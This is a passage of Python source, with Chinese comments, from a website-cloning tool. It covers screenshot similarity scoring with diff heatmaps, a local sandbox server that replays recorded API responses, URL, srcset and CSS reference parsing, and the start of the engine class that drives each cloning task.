    非 RGB/无 numpy 时回落 PIL。"""
    if _np is None or img.mode != "RGB":
        img.save(path)
        return
    w, h = img.size
    Path(path).write_bytes(_png_bytes(w, h, zlib.compress(_sub_filtered(img), 1)))


def _diff_band_deflate(ra, rb, y0, y1, last: bool):
    """分带热力图 → (Sub 滤波扫描行, 原始 deflate 片段)。

    各带独立压缩、非末带以 Z_SYNC_FLUSH 收尾(字节对齐、BFINAL=0), 末带
    Z_FINISH; 片段直接拼接即为合法 deflate 流(pigz 同款做法)。"""
    raw = _sub_filtered(_diff_image(ra, rb, y0, y1))
    comp = zlib.compressobj(1, zlib.DEFLATED, -15)
    return raw, comp.compress(raw) + comp.flush(zlib.Z_FINISH if last else zlib.Z_SYNC_FLUSH)


def _assemble_diff(jobs, view_h, diff_path):
    adler, parts = 1, []
    for job in jobs:
        raw, deflated = job.result()
        adler = zlib.adler32(raw, adler)
        parts.append(deflated)
    idat = b"\x78\x01" + b"".join(parts) + struct.pack(">I", adler & 0xFFFFFFFF)
    Path(diff_path).write_bytes(_png_bytes(SCORE_WIDTH, view_h, idat))


_DIFF_BAND_MIN_ROWS = 1024


_DIFF_MASK_LUT = [255 if p > 28 else 0 for p in range(256)]
_DIFF_DIM_LUT = [int(p * 0.45) for p in range(256)]


def compute_visual_similarity(image_a: Path, image_b: Path, diff_path: Path = None,
                              orig_text: str = "", clone_text: str = "",
                              prime_calibration: bool = False) -> dict:
    """诚实相似度 v3。返回 {score, structure, edge, text, ..., warnings[]}。

    v3 相对 v2 的口径修正:
    - 等比缩放到 512 宽 + 纵向 512 分段比较(v2 把整页长图压成 512×512,
      长页纵向压缩数十倍, 细节差异不可见, 高度差异被拉伸掩盖);
    - 高度不一致时短图以底色补齐, 缺失/多余区域在结构与边缘通道真实失分;
    - 文本通道由召回改为 F2(多余错误文案也扣分)。
    score = 0.5*分段块级NCC + 0.3*分段边缘IoU + 0.2*文本F2(原站无文本时重分配)。
    prime_calibration: 评分解码克隆图时顺带预热像素校准网格缓存(见 _load_fit_pair),
    不改变任何返回值。
    """
    pool = _score_pool()
    text_job = pool.submit(_token_counts, orig_text, clone_text)   # 与解码重叠
    # 两图解码 + 缩放互不依赖: PIL 的 PNG 解码/重采样在 C 层释放 GIL, 并行执行
    (ra, rb), key_a, prime_job = _load_fit_pair(image_a, image_b, prime_calibration)
    h_a, h_b = ra.size[1], rb.size[1]
    height = max(h_a, h_b)
    seg_count = max(1, -(-height // SCORE_SEGMENT))
    canvas_h = seg_count * SCORE_SEGMENT
    ra, rb = _pad_to(ra, canvas_h), _pad_to(rb, canvas_h)

    # 差异热力图与评分无数据依赖: 后台线程生成(含 PNG 编码), 与分段计算重叠
    view_h = min(height, canvas_h)
    diff_job = diff_bands = None
    if diff_path is not None:
        if _np is not None and view_h >= _DIFF_BAND_MIN_ROWS:
            # 长页热力图按行分 3 带并行(逐像素运算 + 分片 deflate), 主线程拼装
            cuts = [view_h * k // 3 for k in range(4)]
            diff_bands = [pool.submit(_diff_band_deflate, ra, rb, cuts[k], cuts[k + 1], k == 2)
                          for k in range(3)]
        else:
            diff_job = pool.submit(_write_diff, ra, rb, view_h, diff_path)

    s_sum = e_sum = w_sum = 0.0
    if _np is not None:
        arr_b = _np.asarray(rb.convert("L"))
        # 参考图侧中间量(边缘掩码/NCC 去均值块)按内容缓存; 克隆图侧边缘 /
        # NCC(分两半)/ 热力图 三路并行, numpy 大数组运算释放 GIL
        mask_a, on_a, preps = _ref_prep(key_a, ra, seg_count, pool)
        edge_job = pool.submit(_edge_iou_from, mask_a, on_a, arr_b, seg_count)
        half = (seg_count + 1) // 2
        ncc_jobs = [pool.submit(_ncc_finish_segments, preps, arr_b, lo, hi)
                    for lo, hi in ((0, half), (half, seg_count)) if hi > lo]
        nccs = [v for job in ncc_jobs for v in job.result()]
        edges = edge_job.result()
        for k in range(seg_count):   # 累加次序与旧版一致(浮点结果逐位相同)
            w = FIRST_SEGMENT_WEIGHT if k == 0 else 1.0
            s_sum += w * nccs[k]
            e_sum += w * edges[k]
            w_sum += w
    else:  # pragma: no cover
        ga, gb = ra.convert("L"), rb.convert("L")
        for k in range(seg_count):
            box = (0, k * SCORE_SEGMENT, SCORE_WIDTH, (k + 1) * SCORE_SEGMENT)
            sa, sb = ga.crop(box), gb.crop(box)
            w = FIRST_SEGMENT_WEIGHT if k == 0 else 1.0
            s_sum += w * _block_ncc(sa, sb, size=SCORE_SEGMENT)
            e_sum += w * _edge_iou(sa, sb)
            w_sum += w
    if diff_job is not None:
        diff_job.result()   # 传播热力图写盘异常(与旧版同步写入语义一致)
    if diff_bands is not None:
        _assemble_diff(diff_bands, view_h, diff_path)
    if prime_job is not None:
        with suppress(Exception):   # 预热失败只影响速度, 校准会自行解码
            prime_job.result()
    structure = s_sum / w_sum
    edge = e_sum / w_sum
    n_a, n_b, inter = text_job.result()   # 原站指纹只算一次
    has_text_source = n_a > 0
    if has_text_source:
        text, recall, precision = _f_from_counts(n_a, n_b, inter)
    else:
        text = recall = precision = 1.0

    if has_text_source:
        score = 100.0 * (0.5 * structure + 0.3 * edge + 0.2 * text)
    else:
        score = 100.0 * (0.6 * structure + 0.4 * edge)
    h_ratio = min(h_a, h_b) / max(h_a, h_b, 1)

    warnings = []
    if has_text_source and recall < 0.5:
        warnings.append(f"可见文本召回率仅 {recall:.0%}: 克隆页缺失原站文字内容(常见于跨域 iframe 未克隆或 JS 渲染失败)")
    if has_text_source and precision < 0.5 <= recall:
        warnings.append(f"可见文本精确率仅 {precision:.0%}: 克隆页多出大量原站没有的文字(兜底壳/报错/未隐藏模板)")
    if h_ratio < 0.7:
        warnings.append(f"页面高度比仅 {h_ratio:.0%}: 克隆页与原站整页长度差异显著(区域缺失或重复)")
    if edge < 0.4:
        warnings.append(f"边缘结构 IoU 仅 {edge:.0%}: 版面骨架差异显著")
    if structure < 0.5:
        warnings.append(f"块级结构相关性仅 {structure:.0%}: 存在大面积错位/缺失区域")

    return {
        "score": round(max(0.0, min(100.0, score)), 1),
        "structure": round(structure, 3),
        "edge": round(edge, 3),
        "text": round(text, 3),
        "text_recall": round(recall, 3),
        "text_precision": round(precision, 3),
        "height_ratio": round(h_ratio, 3),
        "segments": seg_count,
        "scoring": "v3-segmented",
        "warnings": warnings,
    }


def write_diff_preview(image_a: Path, image_b: Path, diff_path: Path) -> None:
    """只生成差异热力图(不评分)。修复循环的中间轮不写热力图, 收敛后调用一次:
    两张图的 512 宽缩放结果都在内容缓存里(刚评过分), 这里不触发任何 PNG 解码。
    像素与 compute_visual_similarity(diff_path=...) 产出的热力图逐值一致。"""
    pool = _score_pool()
    (ra, rb), _key_a, _job = _load_fit_pair(image_a, image_b)
    height = max(ra.size[1], rb.size[1])
    seg_count = max(1, -(-height // SCORE_SEGMENT))
    canvas_h = seg_count * SCORE_SEGMENT
    ra, rb = _pad_to(ra, canvas_h), _pad_to(rb, canvas_h)
    view_h = min(height, canvas_h)
    if _np is not None and view_h >= _DIFF_BAND_MIN_ROWS:
        cuts = [view_h * k // 3 for k in range(4)]
        bands = [pool.submit(_diff_band_deflate, ra, rb, cuts[k], cuts[k + 1], k == 2)
                 for k in range(3)]
        _assemble_diff(bands, view_h, diff_path)
    else:
        _write_diff(ra, rb, view_h, diff_path)


class _SandboxHandler(SimpleHTTPRequestHandler):
    """工作空间沙盒服务器: 静态文件 + VCR 网络磁带 + mock 动态接口。

    供给优先级: 磁带(全量 XHR/fetch 录制, 保真) → Mock(表单接口) →
    静态文件 → SPA 文档兜底。与生成的 Flask 子工程 dispatch 语义对齐。"""

    def __init__(self, *args, directory=None, mocks=None, tape=None, **kwargs):
        self._mocks = mocks or []
        self._tape = tape or []
        super().__init__(*args, directory=directory, **kwargs)

    def log_message(self, format, *args):
        return  # 静默

    def _mock_for(self, method: str):
        target = "/" + (self.path or "/").split("?", 1)[0].strip("/")
        entry = self._match_mock_path(target, method)
        if entry is None and "undefined/" in target:
            # 运行时基地址拼接漂移(BASE 为 undefined 被拼进 URL):
            # 折叠 undefined 段后按录制接口匹配
            collapsed = "/" + re.sub(r"(^|/)undefined(/|$)", "/", target).strip("/")
            entry = self._match_mock_path(collapsed, method)
        if entry is None:
            # 段对齐后缀匹配: 页面目录/undefined 等垃圾前缀叠加时,
            # 录制接口路径作为后缀命中即返回
            entry = self._match_mock_suffix(target, method)
        return entry

    def _match_mock_suffix(self, target: str, method: str):
        req_segs = [s for s in target.split("/") if s]
        best, best_len = None, 0
        for entry in self._mocks:
            segs = [s for s in str(entry.get("path") or "").split("/") if s]
            if len(segs) >= best_len and len(req_segs) > len(segs) \
                    and req_segs[-len(segs):] == segs:
                if str(entry.get("method", "GET")).upper() == method:
                    return entry
                best, best_len = entry, len(segs)
        return best

    def _match_mock_path(self, target: str, method: str):
        loose = None
        for entry in self._mocks:
            if "/" + str(entry.get("path") or "").strip("/") != target:
                continue
            if str(entry.get("method", "GET")).upper() == method:
                return entry
            if loose is None:
                loose = entry
        return loose

    def _serve_mock(self, method: str) -> bool:
        # 文档导航(Accept 以 text/html 开头)永不走 Mock —— 与磁带同一条边界。
        # 根路径带查询串的接口(api.example.com/?functionId=...)录成 path="/" 的
        # Mock 后, 会把入口页本身抢答成 JSON(真实语料: 交互轨整页渲染成接口响应)
        if (self.headers.get("Accept") or "").startswith("text/html"):
            return False
        entry = self._mock_for(method)
        if entry is None:
            return False
        try:
            body = str(entry.get("response_body") or "").encode("utf-8")
        except (ValueError, TypeError):
            body = b""
        try:
            self.send_response(int(entry.get("status") or 200))
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.send_header("X-Mock-Api", "local-sandbox")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        except (BrokenPipeError, ConnectionResetError):
            pass
        return True

    _TAPE_SKIP_EXT = {".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg",
                      ".woff", ".woff2", ".ttf", ".ico", ".map", ".mp4", ".webm"}

    def _tape_for(self, method: str):
        """VCR 磁带匹配(W3 安全协商版): 仅 path+query 精确 → path 精确。

        - 文档导航(Accept 以 text/html 开头)永不走磁带 —— W2 教训;
        - x-component(RSC 导航载荷)只在请求方明确要它时供给:
          Next 客户端路由的 RSC fetch 自带 Accept: text/x-component,
          这是载荷与导航的天然安全边界(W3 变体);
        - 静态扩展名一律绕行磁带(资源字节以磁盘为准)。"""
        if not self._tape:
            return None
        method = method.upper()
        split = urlsplit(self.path or "/")
        path, query = split.path or "/", split.query
        if os_ext(path) in self._TAPE_SKIP_EXT:
            return None
        accept = (self.headers.get("Accept") or "")
        if accept.startswith("text/html"):
            return None
        accept_rsc = "text/x-component" in accept
        for e in self._tape:
            if e.get("method", "GET").upper() == method \
                    and e.get("path") == path and (e.get("query") or "") == query:
                ect = e.get("content_type") or ""
                if "x-component" in ect:
                    if accept_rsc:
                        return e
                    continue   # RSC 载荷只供给明确索要它的路由 fetch
                return e
        for e in self._tape:
            if e.get("method", "GET").upper() == method and e.get("path") == path:
                ect = e.get("content_type") or ""
                if "x-component" in ect:
                    if accept_rsc:
                        return e
                    continue
                return e
        return None

    def _serve_tape(self, method: str) -> bool:
        entry = self._tape_for(method)
        if entry is None:
            return False
        try:
            body = str(entry.get("response_body") or "").encode("utf-8")
        except (ValueError, TypeError):
            body = b""
        try:
            self.send_response(int(entry.get("status") or 200))
            self.send_header("Content-Type",
                             str(entry.get("content_type") or "application/json"))
            self.send_header("X-VCR-Tape", "1")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            with suppress((BrokenPipeError, ConnectionResetError)):
                self.wfile.write(body)
        except (BrokenPipeError, ConnectionResetError):
            pass
        return True

    def do_GET(self):
        if self._serve_tape("GET"):
            return
        if self._serve_mock("GET"):
            return
        # SPA 兜底: 缺失的文档型路径回落入口 HTML —— 客户端路由/重定向
        # (locale 判断/frame-busting 落到未捕获路径)在回放时才有目标页,
        # 交给 SPA 路由器自行渲染, 而不是 404 白屏
        try:
            clean = self.path.split("?", 1)[0].split("#", 1)[0]
            fs_path = Path(self.translate_path(clean))
            if not fs_path.exists() and not os_ext(clean):
                probe = fs_path
                root = Path(self.directory).resolve()
                entry = None
                while True:
                    cand = (probe if probe.is_dir() else probe.parent) / "index.html"
                    if cand.is_file():
                        entry = cand
                        break
                    if probe.parent == root.parent or probe == root:
                        break
                    probe = probe.parent
                if entry is None:
                    entry = root / "index.html"
                if entry.is_file():
                    data = entry.read_bytes()
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html; charset=utf-8")
                    self.send_header("Content-Length", str(len(data)))
                    self.send_header("X-Sandbox-Fallback", "1")
                    self.end_headers()
                    with suppress((BrokenPipeError, ConnectionResetError)):
                        self.wfile.write(data)
                    return
        except Exception:
            pass
        super().do_GET()

    def do_POST(self):
        if self._serve_tape("POST"):
            return
        if self._serve_mock("POST"):
            return
        self.send_error(404, "Not Cloned (POST)")

    def do_PUT(self):
        if self._serve_tape("PUT"):
            return
        if self._serve_mock("PUT"):
            return
        self.send_error(404, "Not Cloned (PUT)")

    def do_PATCH(self):
        if self._serve_tape("PATCH"):
            return
        if self._serve_mock("PATCH"):
            return
        self.send_error(404, "Not Cloned (PATCH)")

    def do_DELETE(self):
        if self._serve_tape("DELETE"):
            return
        if self._serve_mock("DELETE"):
            return
        self.send_error(404, "Not Cloned (DELETE)")


class _LocalPreviewServer:
    """工作空间临时沙盒服务器(静态 + Mock, 视觉比对用)。"""

    def __init__(self, root: Path, use_tape: bool = False):
        mocks = []
        mock_file = root / "mock_data.json"
        if mock_file.is_file():
            try:
                data = json.loads(mock_file.read_text(encoding="utf-8"))
                if isinstance(data, list):
                    mocks = data
            except (OSError, ValueError):
                mocks = []
        tape = []
        tape_file = root / "net_tape.json"
        if use_tape and tape_file.is_file():
            try:
                data = json.loads(tape_file.read_text(encoding="utf-8"))
                if isinstance(data, list):
                    tape = data
            except (OSError, ValueError):
                tape = []
        handler = partial(_SandboxHandler, directory=str(root),
                          mocks=mocks, tape=tape)
        self._httpd = ThreadingHTTPServer(("127.0.0.1", 0), handler)
        self.port = self._httpd.server_address[1]
        self._thread = threading.Thread(target=self._httpd.serve_forever, daemon=True)

    def start(self):
        self._thread.start()

    def stop(self):
        with suppress(Exception):
            self._httpd.shutdown()
            self._httpd.server_close()


def _fmt_size(num: float):
    for unit in ("B", "KB", "MB"):
        if num < 1024 or unit == "MB":
            return f"{num:.1f} {unit}" if unit != "B" else f"{int(num)} B"
        num /= 1024
    return f"{num:.1f} MB"


def os_ext(path: str) -> str:
    """提取小写扩展名(含点); 先剥离 ;jsessionid 等路径参数。"""
    return os.path.splitext(smart_downloader.strip_path_params(path))[1].lower()


# ---------------------------------------------------------------------------
# URL 快速路径: 引擎每任务对上千个资源 URL 反复 urljoin/urlsplit(CSS 引用、
# srcset、替换表变体), urllib 每次调用 ~10µs。对"严格形态"的绝对 http(s) URL
# (小写 scheme、ASCII 主机、路径/查询只含安全字符、无 ; # 空白/控制字符),
# urljoin(base, url) 的所有分支都原样返回 url, urlsplit 的切分也可直接定位;
# 其余一律回落 urllib, 语义不变(差分模糊测试覆盖)。
# ---------------------------------------------------------------------------
_STRICT_ABS_URL_RE = re.compile(
    r"(https?)://([A-Za-z0-9.\-]+(?::[0-9]*)?)"
    r"(/[A-Za-z0-9._~!$&'()*+,=:@%/\-]*)?(?:\?[A-Za-z0-9._~!$&'()*+,=:@%/?\-]*)?\Z")


def _urljoin(base: str, url: str) -> str:
    if base and url and _STRICT_ABS_URL_RE.match(url) and not url.endswith("?"):
        return url
    return urljoin(base, url)


def _split_scheme_netloc_path(url: str):
    """(scheme, netloc, path) —— 与 urlsplit(url) 对应字段一致。"""
    m = _STRICT_ABS_URL_RE.match(url)
    if m:
        return m.group(1), m.group(2), m.group(3) or ""
    parts = urlsplit(url)
    return parts.scheme, parts.netloc, parts.path


# ---------------------------------------------------------------------------
# srcset / image-set 解析
# ---------------------------------------------------------------------------
_SRCSET_URL_RE = re.compile(r"[\s,]*([^\s]+)")


def _srcset_entries(value: str):
    """按 HTML 规范切 srcset: URL 是一段非空白(内部逗号属于 URL, 只剥尾逗号),
    描述符读到括号外的逗号为止。按逗号粗切会把 WordPress/Jetpack 的
    `?resize=150,100 150w` 切成 `?resize=150` 与 `100 150w`, 改写后留下
    `x.jpg,100` 这种 404 候选, 整张图在克隆里裂掉。"""
    entries = []
    text = value or ""
    pos, n = 0, len(text)
    while pos < n:
        m = _SRCSET_URL_RE.match(text, pos)
        if not m:
            break
        url = m.group(1)
        pos = m.end()
        desc = ""
        if url.endswith(","):
            url = url.rstrip(",")
        else:
            depth, start = 0, pos
            while pos < n:
                ch = text[pos]
                if ch == "(":
                    depth += 1
                elif ch == ")":
                    depth = max(0, depth - 1)
                elif ch == "," and depth == 0:
                    break
                pos += 1
            desc = text[start:pos]
            pos += 1
        if not url:
            continue
        width = 1
        tokens = desc.split()
        if tokens:
            digits = tokens[0].lower().rstrip("wx")
            if digits.isdigit():
                width = int(digits) or 1
        entries.append((url, width))
    return entries


def _parse_best_srcset(value: str, base_url: str):
    entries = _srcset_entries(value)
    candidates, best, best_width = [], None, -1
    for url, width in entries:
        if not url or url.startswith(ASSET_SKIP_PREFIXES):
            continue
        absolute = _urljoin(base_url, url)
        if not absolute.startswith(("http://", "https://")):
            continue
        candidates.append(absolute)
        if width > best_width:
            best_width, best = width, absolute
    return best, candidates


# ---------------------------------------------------------------------------
# CSS 递归解析(url() / @import 双语法 / mask-image / image-set)
# ---------------------------------------------------------------------------
# CSS 三条引用正则都以 re.I 字面量开头(url( / @import / image-set(), IGNORECASE
# 让 sre 无法做前缀快速扫描, 1MB 样式表每趟 10~20ms。改为: 在小写化副本里用
# str.find 定位锚点(C 层子串查找), 只在锚点处 match —— 匹配起点必然是锚点,
# 与 finditer 的"最左、非重叠"语义逐位一致。前提: 小写化不改变字符下标且
# 锚点的大小写不敏感匹配只涉及 ASCII —— Unicode re.I 下 i 还与 İ/ı、s 与 ſ
# 互配, 且 İ.lower() 是 2 个字符; 文本含这三个字符时整体回落 finditer。
_CSS_FOLD_TRAPS = ("\u0130", "\u0131", "\u017f")


def _css_lowered(text: str):
    if any(ch in text for ch in _CSS_FOLD_TRAPS):
        return None
    return text.lower()


def _ci_finditer(pattern, text: str, lowered, anchor: str):
    if lowered is None:
        yield from pattern.finditer(text)
        return
    pos = lowered.find(anchor)
    while pos >= 0:
        m = pattern.match(text, pos)
        if m:
            yield m
            pos = lowered.find(anchor, max(m.end(), pos + 1))
        else:
            pos = lowered.find(anchor, pos + 1)


def parse_css_refs(css_text: str, base_url: str):
    """提取 CSS 内所有引用, 严格基于该 CSS 自身的远程 URL 拼接相对路径。"""
    refs, seen = [], set()
    candidates = []

    lowered = _css_lowered(css_text)
    for match in _ci_finditer(CSS_URL_RE, css_text, lowered, "url("):
        candidates.append(match.group(2))  # 覆盖 background/mask/-webkit-mask 等
    for match in _ci_finditer(CSS_IMPORT_RE, css_text, lowered, "@import"):
        candidates.append(match.group("u1") or match.group("u2"))
    for match in _ci_finditer(CSS_IMAGE_SET_RE, css_text, lowered, "image-set("):
        inner = match.group(1)
        for part in re.split(r"\s*,\s*", inner):
            token = part.strip()
            token_match = re.match(
                r"""(?:url\(\s*)?['"]?([^'")\s]+)""", token)
            if token_match:
                candidates.append(token_match.group(1))

    for raw in candidates:
        raw = raw.strip().strip("'\"").strip()
        if not raw or raw in seen or raw.startswith(ASSET_SKIP_PREFIXES):
            continue   # 已收录的原始引用无论如何都会被跳过: 先查重, 免去重复 urljoin
        absolute = _urljoin(base_url, raw)
        if absolute.startswith(("http://", "https://")) and raw not in seen:
            seen.add(raw)
            refs.append((raw, absolute))
    return refs


# ---------------------------------------------------------------------------
# 工具
# ---------------------------------------------------------------------------
def slugify(path: str) -> str:
    text = re.sub(r"[^a-zA-Z0-9]+", "_", (path or "").strip("/")).strip("_")
    return text[:60] or "home"


def _trie_regex(keys) -> str:
    """字面量集合 → 前缀树正则(子分支优先、词尾可选在后 = 同起点取最长匹配)。

    与按长度降序的扁平交替 `k1|k2|...` 匹配结果逐位一致: 两者都在最左起点
    取最长命中的键; 但前缀树每个位置只沿一条字符路径前进, 不再对上千个
    备选逐一试配(本地化替换表 ~1200 键时提速一个数量级)。"""
    trie = {}
    for key in keys:
        node = trie
        for ch in key:
            node = node.setdefault(ch, {})
        node[""] = True

    def emit(node):
        end = "" in node
        kids = [(ch, sub) for ch, sub in node.items() if ch != ""]
        if not kids:
            return ""
        alts = []
        singles = []
        for ch, sub in sorted(kids):
            chain = [ch]
            while "" not in sub and len(sub) == 1:   # 单链压缩: 递归深度 = 分叉数
                (nxt, sub), = sub.items()
                chain.append(nxt)
            tail = emit(sub)
            if tail or len(chain) > 1:
                alts.append(re.escape("".join(chain)) + tail)
            else:
                singles.append(ch)   # 叶子字符合并为字符类
        if singles:
            alts.append(re.escape(singles[0]) if len(singles) == 1
                        else "[" + "".join(re.escape(c) for c in singles) + "]")
        body = alts[0] if len(alts) == 1 and not end else "(?:" + "|".join(alts) + ")"
        if end:
            body = (body if body.startswith("(?:") else "(?:" + body + ")") + "?"
        return body

    return emit(trie)


_REPL_CACHE: dict = {}   # 同一替换表在多页/多 JS 文件间复用编译结果


def _replacement_matcher(pairs):
    key = tuple(pairs)
    hit = _REPL_CACHE.get(key)
    if hit is not None:
        return hit
    mapping = dict(pairs)
    olds = [old for old, _ in pairs]
    lengths = [len(o) for o in olds]
    pattern = None
    if "" not in mapping and all(a >= b for a, b in zip(lengths, lengths[1:])):
        try:
            pattern = re.compile(_trie_regex(olds))
        except (RecursionError, re.error, OverflowError):   # 病态超深前缀树
            pattern = None
    if pattern is None:   # 非降序/含空键/病态: 保持旧语义(按列表顺序首个命中)
        pattern = re.compile("|".join(re.escape(old) for old in olds))
    if len(_REPL_CACHE) >= 8:
        _REPL_CACHE.clear()
    _REPL_CACHE[key] = hit = (pattern, mapping)
    return hit


def _html_escaped_pairs(pairs: list) -> list:
    """HTML 用替换表: 原表 + 键中 & 换成 &amp; 的变体, 仍按长度降序。

    浏览器序列化 DOM 时属性值里的 & 一律写成 &amp;(src/srcset/href 的查询串、
    CDN 图片处理参数 `@base@tag=imgScale&F=webp&w=..`), 原表只有字面 URL,
    这类引用整体漏改写、离线沙箱里外链被拦成空白。JS/CSS 文本不经序列化, 不用此表。"""
    extra = [(k.replace("&", "&amp;"), v) for k, v in pairs
             if "&" in k and "&amp;" not in k]
    if not extra:
        return pairs
    merged = dict(pairs)
    for k, v in extra:
        merged.setdefault(k, v)
    return [(k, merged[k]) for k in sorted(merged, key=len, reverse=True)]


def apply_replacements(text: str, pairs) -> str:
    """单趟正则替换全部 URL 变体(pairs 需按长度降序)。"""
    if not pairs:
        return text
    pattern, mapping = _replacement_matcher(pairs)
    return pattern.sub(lambda m: mapping.get(m.group(0), m.group(0)), text)


class ClonerEngine:
    """单任务克隆执行器(V4 同步线程模型), 由调度器工作线程驱动。"""

    def __init__(self, task_id, db, bus, pool):
        self.task_id = task_id
        self.db = db
        self.bus = bus
        self.pool = pool
        self.task = None
        self.cfg = {}
        self.ws: Path = config.WORKSPACE_ROOT / str(task_id)
        self._target = ""
        self._mock_raw = []
        self._dl_headers = {}
        self.downloader = None           # SmartDownloader, run() 中构造
        self._live_seen = {}             # 活体渲染期成功加载的资源 URL -> resource_type
        self._live_resp = {}             # 活体 200 响应(页面关闭前取响应体)
        self._live_bodies = {}           # URL -> 下载结果结构(浏览器已加载的字节, 免重下)
        self._live_body_bytes = 0
        self._raw_refs = {}              # 原始引用字符串 -> 绝对 URL(本地化替换用)
        self._page_dir = "/"             # 目标页所在目录(目录型 URL, 相对路径基准)
        self._page_frag = ""             # 目标 URL 的 hash 路由(SPA #/login)
        self._pattern_info = {"pattern": "DEFAULT", "features": [], "confidence": 0.0}
        self._strategy_pack = strategy_packs.for_pattern("DEFAULT")
        self._fidelity_score = None           # N1 保真轨评分(双轨取优用)
        self._fidelity_rendered = False      # 保真轨 MHTML 已渲染(每任务一次)
        self._layout_calibrated = False      # 布局校准已尝试(每任务一次)
        self._backfill_dead = set()          # 修复回补回源失败的 URL(跨轮负缓存)
        self._calibrations = 0               # A1 像素校准执行次数
        self._phase_acc = {}                 # 子阶段累计耗时(秒): 提速定位用
        self._calib_css = ""                 # A1 校准覆盖(跨修复轮持久, _localize 注入)
        self._band_floor = 0                 # 采集视口断点区间下界(视口作用域固化用)
        self._captured_at = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
        self._net_tape = []              # VCR 网络磁带(W2): XHR/fetch 全量文本响应
        self._tape_seen = set()          # (method, path, query) 去重
        self._tape_bytes = 0
        self._stat_accum = {"css": 0, "js": 0, "img": 0, "fonts": 0,
                            "media": 0, "misc": 0, "bytes": 0}
        self._timeline = []              # [(stage, 单调时钟)] 阶段切换记录(端到端度量)

    # ------------------------------------------------------------------
    def log(self, stage: str, message: str):
        self.bus.publish(self.task_id, stage, message)
        # 任务日志落盘(工作区 engine.log): 内存环形队列只留最近几百条, 事后归因
        # (语料跑分的低分站)要能翻到采集期的每一步
        ws = getattr(self, "ws", None)
        if ws is not None:
            with suppress(OSError):
                with open(ws / "engine.log", "a", encoding="utf-8") as fh:
                    fh.write(f"{time.strftime('%H:%M:%S')} [{stage}] {message}\n")

    def _set(self, progress=None, stage=None, **extra):
        fields = dict(extra)
        if progress is not None:
            fields["progress"] = int(progress)
        if stage is not None:
            fields["stage"] = stage
            if not self._timeline or self._timeline[-1][0] != stage:
                self._timeline.append((stage, time.monotonic()))
        self.db.update_task(self.task_id, **fields)

    def _phase(self, name: str, t0: float) -> float:
        """子阶段计时: 把 t0 起的耗时累加到 name, 返回当前时刻供下一段接力。"""
        now = time.monotonic()
        acc = getattr(self, "_phase_acc", None)
        if acc is not None:
            acc[name] = acc.get(name, 0.0) + (now - t0)
        return now

    def _phase_times(self) -> dict:
        return {k: round(v, 1) for k, v in getattr(self, "_phase_acc", {}).items()}

    def _stage_times(self) -> dict:
        """阶段耗时(秒, 1 位小数), 按出现顺序; 真实语料跑分用它定位时间去哪了。"""
        out = {}
        now = time.monotonic()
        for i, (stage, t0) in enumerate(self._timeline):
            t1 = self._timeline[i + 1][1] if i + 1 < len(self._timeline) else now
            out[stage] = round(out.get(stage, 0.0) + (t1 - t0), 1)
        return out

    # ------------------------------------------------------------------
    def run(self):
        self.task = self.db.get_task(self.task_id)
        if self.task is None:
            return
        batch = self.db.get_batch(self.task["batch_id"])
        try:
            self.cfg = json.loads(batch.get("config_json") or "{}")
        except ValueError:
            self.cfg = {}
        parts = self.bind_target(self.task["target_url"])
        origin = f"{parts.scheme}://{parts.netloc}"
        domain = self.task["domain"] or parts.netloc

        for sub in ("css", "js", "img", "fonts", "media", "misc"):
            (self.ws / "static" / sub).mkdir(parents=True, exist_ok=True)
        (self.ws / "frames").mkdir(parents=True, exist_ok=True)
        self._dl_headers = {
            "User-Agent": self.cfg.get("user_agent") or config.DEFAULT_USER_AGENT,
            "Referer": self._target,
            "Accept": "*/*",
        }
        if self.cfg.get("cookie"):
            self._dl_headers["Cookie"] = self.cfg["cookie"]
        if self.cfg.get("bearer"):
            self._dl_headers["Authorization"] = f"Bearer {self.cfg['bearer']}"
        self.downloader = smart_downloader.SmartDownloader(self._dl_headers,
                                                           log=self.log)

        self._set(progress=5, stage="DOM渲染", status="running",
                  workspace_path=str(self.ws), error_msg="")
        self.log("RENDER", f"任务 #{self.task_id} 启动: {self._target}")
        started = time.time()
        try:
            self._execute(origin, domain)
        except Exception as exc:
            # 瞬时 Playwright 会话崩溃(页面重导航/浏览器回收/网络瞬断)
            # 与稳定失败不同源: 换新会话整链重跑一次, 偶发不判死
            if not isinstance(exc, TargetUnreachable) \
                    and not getattr(self, "_transient_retried", False) and any(
                    m in f"{type(exc).__name__}: {exc}" for m in _TRANSIENT_ERROR_MARKS):
                self.log("WARN", f"瞬时会话崩溃, 自动重试: {type(exc).__name__}: {exc}")
                # 整链重跑前重置运行态(磁带/引用表/校准/保真轨/统计累加器),
                # 防上一次半途采集的残留混入新会话的产物与评分
                self.__init__(self.task_id, self.db, self.bus, self.pool)
                self._transient_retried = True
                self._set(status="running", stage="重试渲染", progress=4, error_msg="")
                return self.run()
            self.log("ERROR", f"任务失败: {type(exc).__name__}: {exc}")
            # 失败任务同样落阶段耗时与失败类别: 语料跑分区分"网络不可达"与"引擎失败"
            fail_stats = {"stage_times": self._stage_times(),
                          "failure": "unreachable" if isinstance(exc, TargetUnreachable)
                          else "engine"}
            fail_stats["elapsed_s"] = round(sum(fail_stats["stage_times"].values()), 1)
            self._set(status="failed", error_msg=f"{type(exc).__name__}: {exc}"[:1500],
                      stats_json=json.dumps(fail_stats, ensure_ascii=False))
            return
        elapsed = time.time() - started
        self.log("INFO", f"任务 #{self.task_id} 完成, 耗时 {elapsed:.1f}s")

    def bind_target(self, target_url: str):
        """绑定目标 URL: 目录型 URL(/apps/#/login)页面真实位置在目录下, 相对路径
        (webpack publicPath='' 懒加载 chunk)以此为基准; 记录 page_dir, 本地化时按
        原路径落位, 避免页面挪到根路径后相对引用全体漂移。返回 urlsplit 结果。
        手动 AI 修复等离线入口也要先绑定, 否则 _main_page_file 落错文件。"""
        self._target = target_url
        parts = urlsplit(target_url)
        target_path = parts.path or "/"
        self._page_dir = "/"
        if target_path.endswith("/") or "." not in target_path.rsplit("/", 1)[-1]:
            # 归一化: 目标路径是不可信输入, `..` 段会让影子页落盘逃出工作区
            self._page_dir = _normalize_page_dir(target_path)
        self._page_frag = ("#" + parts.fragment) if parts.fragment else ""
        return parts

    def _full_shot(self, page, path, label="截图", _fresh=False):
